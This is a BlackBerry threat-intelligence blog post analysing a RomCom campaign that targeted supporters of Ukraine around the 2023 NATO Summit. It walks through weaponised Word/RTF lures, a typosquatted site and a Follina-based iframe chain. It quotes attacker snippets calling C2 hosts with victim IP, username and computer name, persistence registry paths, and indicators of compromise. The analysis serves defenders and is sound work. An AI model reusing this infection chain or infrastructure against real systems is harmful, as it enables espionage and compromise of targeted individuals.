# Reference for threat actor for "Tropical Scorpius, RomCom"

**Title**: RomCom Threat Actor Suspected of Targeting Ukraine's NATO Membership Talks at the NATO Summit

**Source**: https://blogs.blackberry.com/en/2023/07/romcom-targets-ukraine-nato-membership-talks-at-nato-summit

## Content








RomCom Threat Actor Suspected of Targeting Ukraine's NATO Membership Talks at the NATO Summit

































Skip Navigation






BlackBerry Logo































Cybersecurity


Automotive & IOT


Critical Communications


Inside BlackBerry











×




























BlackBerry Blog













BlackBerry Blog


        RomCom Threat Actor Suspected of Targeting Ukraine's NATO Membership Talks at the NATO Summit
    










RomCom Threat Actor Suspected of Targeting Ukraine's NATO Membership Talks at the NATO Summit




RESEARCH & INTELLIGENCE / 07.08.23 / 
The BlackBerry Research & Intelligence Team






Share on Twitter







Share on Facebook







Share on Linked In







Email















Image credit: S_E - stock.adobe.com
Summary
On July 4, the BlackBerry Threat Research and Intelligence team found two malicious documents submitted from an IP address in Hungary, sent as lures to an organization supporting Ukraine abroad, and a document targeting upcoming NATO Summit guests who may also be providing support to Ukraine.
Our analysis based on the tactics, techniques, and procedures (TTPs), code similarity, and threat actor network infrastructure leads us to conclude that the threat actor known as RomCom is likely behind this operation.
Based on our internal telemetry, network data analysis, and the full set of cyber weapons we collected, we believe the threat actor behind this campaign ran their first drills on June 22, and also a few days before the command-and-control (C2) mentioned in this report was registered and went live.
Update 7/10/23: Note that BlackBerry shared this intelligence with relevant government agencies several days prior to publishing this blog.

Weaponization and Technical Overview



Weapons

Documents, PE

Attack Vector

Unconfirmed (highly likely email)

Network Infrastructure

Domains, IPs (SMB, HTTP)

Targets

Individuals and countries supporting Ukraine



Technical Analysis
Context
Lithuania is hosting a NATO Summit in Vilnius on July 11-12. One of the topics on the agenda is Ukraine and its possible future membership in the organization. President of Ukraine Zelenskyy confirmed his participation.
Taking advantage of this event and the request of Ukraine to join NATO, threat actors have created and distributed a malicious document impersonating the Ukrainian World Congress organization to presumably distribute to supporters of Ukraine.








Figure 1: Word document used as a lure during this attack
The infection technique used in the document is RTF exploitation, with outbound connections initiated from the victim’s machine once the victim opens the document.
We also found another malicious document from the same threat actor, which we believe is a lure based around the upcoming NATO Summit. Essentially, it's a fake lobbying document in support of Ukraine.








Figure 2: Second document related to this intrusion
Attack Vector
Although we haven't yet uncovered the initial infection vector, the threat actor likely relied on spear-phishing techniques, engaging their victims to click on a specially crafted replica of the Ukrainian World Congress website.
The malicious domain uses typosquatting techniques to masquerade the fake website with a .info suffix and make it look legitimate.

Real Domain

Fake Domain

ukrainianworldcongress[.]org

ukrainianworldcongress[.]info


 








Figure 3: Spot the difference between the legitimate and the fake Ukrainian World Congress website
Checking the source code of the fake website proves it's a cloned copy of the original one. Notably, the website is registered as a .info domain.
We have observed the RomCom threat actor using the same technique in previous campaigns.
The details of both observed documents are below:

Sha256

a61b2eafcf39715031357df6b01e85e0d1ea2e8ee1dfec241b114e18f7a1163f

File Name

Overview_of_UWCs_UkraineInNATO_campaign.docx

File Size

120614 bytes

Created Date

2023:06:26 12:57:00Z

Modify Date

2023:06:27 16:27:00Z

Last Modified By

vboxuser

ZipCRC

0xb71a911e


 

Sha256

3a3138c5add59d2172ad33bc6761f2f82ba344f3d03a2269c623f22c1a35df97

File Name

Letter_NATO_Summit_Vilnius_2023_ENG(1).docx

File Size

24690 bytes

Created Date

2023:06:19 10:50:00Z

Modify Date

2023:06:27 16:22:00Z

Last Modified by

vboxuser

ZipCRC

0xb71a911e



Weaponization
As mentioned above, the document “Overview_of_UWCs_UkraineInNATO_campaign.docx” contains an embedded RTF file named afchunk.rtf.

Sha256

e7cfeb023c3160a7366f209a16a6f6ea5a0bc9a3ddc16c6cba758114dfe6b539

File name

afchunk.rtf

File Size

44146 bytes

Created Date

2022:08:29 04:36:00

Modify Date

2022:08:29 04:37:00

Last Modified by

X

Default Languages

Portuguese - Brazil, Arabic - Saudi Arabia



Once the Microsoft Word file is downloaded and executed/opened by the user, an OLE object is loaded from the RTF, which connects to the IP address 104.234.239[.]26, which is related to VPN/proxies services. The connections are made to ports 80, 139, and 445 (HTTP and SMB services).








Figure 4: Contents of the RTF file afchunk.rtf
The file called file001.url is, in fact, a document in the form of a Microsoft Word file. This file is loaded after the execution of the NATO lure.








Figure 5: Files stored within file001

Sha256

07377209fe68a98e9bca310d9749daa4eb79558e9fc419cf0b02a9e37679038d

File Name

File001.url

File Size

23870 bytes

Created Date

2022:04:13 13:11:00

Modify Date

2022:04:13 13:11:00

Last Modified by

Eduardo

Author

Eduardo

Language Code

Portuguese (Brazilian)


 








Figure 6: Part of file001.urlx
This file's goal is to load the OLE streams into Microsoft Word, to render an iframe tag responsible for the execution of the next stage of malware.
It tries to obtain the computer's IP address, which should be passed in the "?d=" parameter, and then build a path in /appdata/local/temp/. As we have observed, there are other communications of the main Word payload, passing as a parameter the IP of the user opening the file.

hxxp://74.50.94[.]156/MSHTML_C7/zip_k.asp?d=34.141.245.25_f68f9_
hxxp://74.50.94[.]156/MSHTML_C7/zip_k2.asp?d=34.141.245.25_f68f9_
hxxp://74.50.94[.]156/MSHTML_C7/zip_k3.asp?d=34.141.245.25_f68f9_

After the connection is made to \\104.234.239[.]26\share1\MSHTML_C7\file001.url, a second connection is made by the threat actor via HTTP to the same server mentioned in the above three URLs.








Figure 7: Second connection made by afchunk.rtf
hxxp://74.50.94[.]156/MSHTML_C7/start.xml contains another iframe HTML tag to load from the path of the server a file called “RFile.asp”. Additionally, it stores in the variable “lt” the value “<” and in the variable “gt” the value “>”.








Figure 8: Contents of the file “start.xml” during the connection
Whenever a user visits the website, multiple files are generated automatically in the server to use during the intrusion. These files are sent from the URL hxxp://74.50.94[.]156/share1/MSHTML_C7/1/








Figure 9: Victim's data captured by the threat actor
Since there is an iframe tag present, then you’ll see another HTTP request sent automatically to the file RFile.asp, which is under the same path. The goal of the RFile.asp file is to load another iframe with a file autogenerated previously, which contains the victim's IP address.








Figure 10: Contents of the RFile.asp file
Next, there is a pause/sleep of 15,000 milliseconds (15 seconds). After that, an iframe is loaded to the main path of the file server used previously: file//104.234.239[.]26/share1/MSHTML_C7. And finally, another iframe is executed to load a file once, generated automatically by the server with the information about the IP address of the victim and an additional ID of five digits. To understand the format, it should look like this:
< iframe src = file: //104.234.239[.]26/share1/MSHTML_C7/1/99.99.99.99_a15fa_file001.htm?d=99.99.99.99_ a15fa_></iframe>
99.99.99.99_a15fa_file001.htm









Figure 11: Beginning of the file <ipv4>_<id>_file001.htm
The beginning of this file starts initializing a variable call “o2010” to “False”. After that, it tries to load the icon of Microsoft Excel, using the <img> HTML tag. That assumes that Microsoft Office14 is installed in the system. In case the image is loaded, then the value of “o2010” is changed to “True.”
The following portion of code creates five divs with the id sequential from one to five. The first includes another iframe to <ipv4>_<id>_file001.search-ms. A fictitious example might be 99.99.99.99_a15fa_file001.search-ms. That file would then be stored in the same path as the HTML file.








Figure 12: Script tag initialization in the file <ipv4>_<id>_file001.htm
This script continues initializing a script tag and creating some variables for use during the execution of this HTM file.

Variable

Value

CompName

Victim’s computer name

UName

Victim’s username

loc

Actual URL location

d_s

Stores the value “?d=” which will be used after infection

dx

Using the indexOf function returns the index at which a given element ca be found in the array

d

In the if, it obtains the value of the parameters given in the URL under ?d=, which is the IP address.



After storing those variables, it calls the setTimeout method to call the function “f1()” after 1.3 seconds.








Figure 13: Functions starting with f1 in the <ipv4>_<id>_file001.htm file
Four different functions are declared starting with f1. All of them are called one after the other.

Function f1() changes the content of the div with ID “d1” with the content “<b>!</b>”. Then, it waits 1.3 seconds before calling the function f1a().
Function f1a() changes the content of the div with ID “d2” adding a new iframe with the content of the file hxxp://74.50.94[.]156/MSHTML_C7/zip_k.asp?d=99.99.99.99. When it’s loaded, it waits 1.3 seconds before calling the function f1b().
Function f1b() changes the content of the div with ID “d2” too, adding a new iframe with the content of the file hxxp://74.50.94[.]156/MSHTML_C7/zip_k2.asp?d=99.99.99.99. As you can see, the difference between this function the f1a() is that the resource requested is zip_k2.asp and not zip_k.asp. When the iframe is loaded, it waits 1.3 seconds before calling the function f1c().
Function f1c() changes the content of the div with ID “d3”, adding a new iframe with the content of the file hxxp://74.50.94[.]156/MSHTML_C7/zip_k3.asp?d=99.99.99.99. When it’s loaded, it waits 1.3 seconds before calling the function f2().









Figure 14: end of the <ipv4>_<id>_file001.htm file
The end of the <ipv4>_<id>_file001.htm file contains other functions and iframes that are also loaded.

Function f2() changes the content of the div with ID “d1”, adding a new iframe with the content of the file <ipv4>_<id>_file001.search-ms (an example could be 99.99.99.99_a15fa_file001.search-ms). The content of the div with ID “d1” is the same at the beginning of the htm file.
Function f3() verifies if the variable “o2010” is False or True, and depending on the value this creates different actions.
o2010 == False: Changes the content of the div with ID “d3”, adding a new object to the HTML (the goal of the use of this object instead of the iframe is the same, which is to display another file). The resource loaded is redir_obj.html?d=<ipv4>&c=<computer>&u=<username>
o2010 == True: Changes the content of the div with ID “d3”, adding a new iframe with the content of the file hxxp://74.50.94[.]156/MSHTML_C7/o2010.asp?d=99.99.99.99*



(*) the IP 99.99.99.99 shown above is just used as an example to illustrate these connections.
The file loaded in some of the iframes shown so far is a .search-ms file. These files are a Windows-saved search file, and can perform file searches through Windows.
This execution chain utilizes CVE-2022-30190, which is a zero-day vulnerability affecting Microsoft's Support Diagnostic Tool (MSDT) uncovered in May 2022.
Also known as Follina, the vulnerability was assigned a high severity CVSS score, with a freely available proof of concept (POC) exploit code appearing in the wild shortly thereafter.
If successfully exploited, it allows an attacker to conduct a remote code execution (RCE)-based attack via the crafting of a malicious .docx or .rtf document designed to exploit the vulnerability.
This is achieved by leveraging the specially crafted document to execute a vulnerable version of MSDT, which in turn allows an attacker to pass a command to the utility for execution. This includes doing so with the same level of privileges as the person who executed the malicious document. That technique is effective even when macros are disabled and even when a document is opened in Protected mode.
It was one of the most heavily exploited by threat actors of all variations, including those classed as advanced persistent threats (APTs) throughout the remainder of 2022 and up to the present.
There are also other files which are loaded during the iframes’ chain execution. The first one is the redir_obj.html, which receives three values in the GET request.

d: As we saw previously, this is the IP address of the victim
c: Contains victim’s PC information
u: Username of the victim’s computer









Figure 15: Beginning of the file redir_obj.htm
The beginning of the file is quite similar to the <ipv4>_<id>_file001.htm file, where the goal is obtaining the actual URL and the parameters given in the GET content. After that, it obtains the index where each parameter is stored into the URL.








Figure 16: Checks to verify the parameters in the redir_obj.htm file
The next section of this code is used to verify whether the parameters given in the URL exist. If yes, the value of the variables are True; however, if the values don’t exist, the value is shown as False.








Figure 17: Last piece of code in the redir_obj.htm file
The last piece of code of this htm file checks whether all the values were set to True or not. In case all of them are true, it uses the document.write function to print the next value:
<meta http-equiv=refresh content="0;URL=file://computer01/c$/users/bob/appdata/local/temp/temp1_99.99.99.99file001.zip/1111.htm">
The above example uses 99.99.99.99 as a “d” parameter, computer01 with “c” parameter, and bob value for the “u” parameter.
If any of the values was not established, then it returns the following (In this case, we have not created the value for the “u” parameter):
< html > d = true < br > c = true < br > u = false < /html>








Figure 18: Connections made to the 104.234.239[.]26 server after executing/opening the Word document
Agent

Sha 256
Md5

1a7bb878c826fe0ca9a0677ed072ee9a57a228a09ee02b3c5bd00f54f354930f
f4959e947cee62a3fa34d9c191dd9351

ITW File Name

Calc.exe

Compilation Stamp

2023-06-30 06:29:32 UTC

File Type/Signature

X64 DLL

File Size

262656 bytes

Compiler Name/Version

MS C++ 2022 v 17.4

<Additional Information>

The sample contains the encryption strings of the algorithm used in the RomCom RAT.



The payload is an executable, written in C++. The downloader includes numerous strings that are utilized during execution. It is worth mentioning that a similar string encryption algorithm was identified in the RomCom remote access trojan (RAT) samples we came across a few months ago.








Figure 19: One of the encrypted strings in the downloader.
To use a string, the program needs to decrypt it. To do that, the decryption function gets a 64-bit key to decrypt the data. The algorithm uses a fairly unique 64-bit key as a constant to decrypt each string. That is, a different key is used for each string. Although we did not find that the RomCom RAT samples code used the same constants for decryption, the approach to decrypting the string is very similar to how it was implemented in the RomCom RAT.








Figure 20: The figure above shows a fragment of the string decrypter code that is used in this sample.
 Sha-256 (1a7bb878c826fe0ca9a0677ed072ee9a57a228a09ee02b3c5bd00f54f354930f)
  








Figure 21: The RomCom RAT sample we discovered a few months earlier. 
 Sha-256 (0501d09a219131657c54dba71faf2b9d793e466f2c7fdf6b0b3c50ec5b866b2a)
All RomCom RAT samples we analyzed contained string encryption. That is a custom, rather simple algorithm based on the XOR operation on a certain key (32 or 64 bits) which is passed to the decryption function as an argument. Based on these overlaps, we can state with a medium to high degree of confidence that the same operator or a member of the original RomCom operations team is behind this attack.
After the sequence of scripts starts the final payload—RomCom downloader—the file connects to the remote server to register the new victim.

hxxp://finformservice[.]com:80/api/v1.5/subscriptiontoken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTIzNDU2Nzg5LCJuYW1lIjoiSm9zZXBoI
n0.OpOSSw7e485LOP5PrzScxHb7SR6sAOMRckfFwi4rp7o

Then a special directory and file will be created in the system. The next stage payload will be loaded if the attacker decides that the victim is of interest:

"C:\\Users\\Public\\AccountPictures\\Defender\\Security.dll

RomCom downloader writes security.dll to autorun to be permanently present in the system.

SOFTWARE\Microsoft\Windows\CurrentVersion\Run

When the payload is successfully downloaded, the RomCom downloader starts the Windows service.
The RomCom downloader also collects information about the system on which it is running. Such as:

The size of the device’s RAM
Username
Information about the machine’s network adapter.

Here are some strings that will be decrypted at runtime.
hxxp://65.21.27[.2]50:8080/mds/O--------------------------
hxxp://finformservicecom:8080/mds/S-------------------------- 
hxxp://65.21.27[.]250:8080 /mds/D-------------------------- 
\OneDriveSrvdll 
CreateServiceW
C:\Windows\System32\svchost.exe -k DcomLaunch
{2781761 E-28E0-4109-99FE-B9D127C57AFE} 
SOFTWARE\Classes\CLSID\_sam_
SOFTWARE\Classes\CLSID\{F5078F32-C551-11D3-89B9-0000F81FE221}\InProcServer32
\WindowsNT\Accessories\wordpad.exe
SOFTWARE\Microsoft\Windows\CurrentVersion\Run
DcomLaunchOneDrive Srv
Network Infrastructure
While tracking this campaign, we correlated access to several C2s and multiple victim IPs from a single server. This server, in the week leading up to this campaign, accessed known RomCom infrastructure. The heavy overlap in access from this central point, 143[.]198.18.163, yields us to state with medium to high confidence that the threat actor behind both these infrastructures is the same.
 

IP

First Seen

Last Seen

Description

Port

104[.]234.239.26

6/13/23 17:17

6/15/23 7:55

OLE fileshare from Lure

445

138[.]124.183.8

6/14/23 7:08

6/28/23 11:31

RomCom C2 bentaxworld[.]com

443

45[.]9.148.118

6/14/23 8:25

6/29/23 15:08

RomCom C2 penofach[.]com

443

45[.]9.148.219

6/15/23 12:01

6/15/23 13:19

 
22

45[.]9.148.123

6/19/23 8:18

6/22/23 14:48

RomCom C2 altimata[.]org

443

74[.]50.94.156

6/21/23 11:56

6/29/23 8:14

OLE C2 from lure

3389

209[.]159.147.170

6/26/23 12:18

6/29/23 8:22

Accessed SMB Share

3389

66[.]23.226.102

6/26/23 12:19

6/29/23 7:48

Accessed SMB Share

443

209[.]127.116.190

6/26/23 15:15

6/29/23 5:27

 
3389

65[.]21.27.250

6/28/23 13:30

7/5/23 11:19

Finformservice[.]com

22


 








Figure 22: Network infrastructure relationship between known RomCom ops and the lure on the upcoming NATO summit.

The RomCom threat actor controlled C2 utilizes the same SSL certificate structure as noted in one of our previous RomCom blogs. Also showing interesting timing is a new certificate created on July 6 using the same SSL certificate structure as other RomCom C2s.








Figure 23: SSL Structure and timelines used in preparation for the attack luring on the upcoming NATO summit

Historically, when campaigns begin utilizing a domain that has previously deployed a self-signed certificate, a public certificate will be registered. On June 29, penofach[.]com had a valid SSL certificate created for the dashboard.penofach[.]com subdomain, and began hosting a dashboard with a login page.
 
    
    








Figure 24: RomCom SSL information
Targets
Based on the nature of the upcoming NATO Summit and the related lure documents sent out by the threat actor, the intended victims are representatives of Ukraine, foreign organizations, and individuals supporting Ukraine.
Conclusions
Based on the available information, we have medium to high confidence to conclude that this is a RomCom rebranded operation, or that one or more members of the RomCom threat group are behind this new campaign supporting a new threat group. The information we base this conclusion on includes: 

Geopolitical context
Domain’s registration and HTML scraping of legitimate websites
Certain similarities in the code between this campaign and previously known RomCom campaigns
Network infrastructure information
 

APPENDIX 1 – Referential Indicators of Compromise (IoCs)
Main Word Documents

Sha256

a61b2eafcf39715031357df6b01e85e0d1ea2e8ee1dfec241b114e18f7a1163f

File Name

Overview_of_UWCs_UkraineInNATO_campaign.docx

File Size

120614 bytes

Created Date

2023:06:26 12:57:00Z

Modify Date

2023:06:27 16:27:00Z

Last Modified by

vboxuser

ZipCRC

0xb71a911e


 

Sha256

3a3138c5add59d2172ad33bc6761f2f82ba344f3d03a2269c623f22c1a35df97

File Name

Letter_NATO_Summit_Vilnius_2023_ENG(1).docx

File Size

24690 bytes

Created Date

2023:06:19 10:50:00Z

Modify Date

2023:06:27 16:22:00Z

Last Modified by

vboxuser

ZipCRC

0xb71a911e



Malicious RTF

Sha256

e7cfeb023c3160a7366f209a16a6f6ea5a0bc9a3ddc16c6cba758114dfe6b539

File Name

afchunk.rtf

File Size

44146 bytes

Created Date

2022:08:29 04:36:00

Modify Date

2022:08:29 04:37:00

Last Modified by

X

Default Languages

Portuguese - Brazil, Arabic - Saudi Arabia



Second Stage

Sha256

07377209fe68a98e9bca310d9749daa4eb79558e9fc419cf0b02a9e37679038d

File Name

File001.url

File Size

23870 bytes

Created Date

2022:04:13 13:11:00

Modify Date

2022:04:13 13:11:00

Last Modified by

Eduardo

Author

Eduardo

Language Code

Portuguese (Brazilian)


 

Domain

hxxp://finformservice[.]com:80/api/v1.5/
subscriptiontoken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJpZCI6MTIzNDU2Nzg5LCJuYW1lIjoiSm9zZXBoIn0.
OpOSSw7e485LOP5PrzScxHb7SR6sAOMRckfFwi4rp7o

IP
hxxp://65.21.27.250:8080/mds/O--------------------------hxxp://65.21.27.250:8080/mds/D--------------------------hxxp://65.21.27.250:8080/mds/S--------------------------


 
Disclaimer: The private version of this report is available upon request. It includes, but is not limited to, the complete and contextual MITRE ATT&CK® mapping, MITRE D3FEND™ countermeasures, Attack Flow by MITRE, and other threat detection content for tooling, network traffic, complete IoCs list, and system behavior. Please email us at cti@blackberry.com for more information.
For similar articles and news delivered straight to your inbox, subscribe to the BlackBerry Blog.
Related Reading

Unattributed RomCom Threat Actor Spoofing Popular Apps Now Hits Ukrainian Militaries

RomCom Threat Actor Abuses KeePass and SolarWinds to Target Ukraine and Potentially the UK
RomCom Resurfaces: Targeting Politicians in Ukraine and U.S.-Based Healthcare Providing Aid to Refugees from Ukraine









Join BlackBerry for a day of inspiring keynotes, presentations, and discussions at the tenth BlackBerry Summit, Oct. 17, 2023, in New York.







About The BlackBerry Research & Intelligence Team
The BlackBerry Research & Intelligence team examines emerging and persistent threats, providing intelligence analysis for the benefit of defenders and the organizations they serve.









Share on Twitter







Share on Facebook







Share on Linked In







Email









Back













Facebook






Twitter





YouTube





Instagram
























Corporate
                              










Company


Newsroom


Investors


Careers


Leadership


Corporate Responsibility


Certifications


Customer Success







Developers
                              










Enterprise Platform & Apps


BlackBerry QNX Developer Network




Blogs
                              










BlackBerry ThreatVector Blog


Developers Blog


Help Blog







Legal
                              










Overview


Accessibility


Patents


Trademarks


Privacy Policy










                        © 2024 BlackBerry Limited. All rights reserved.
                    














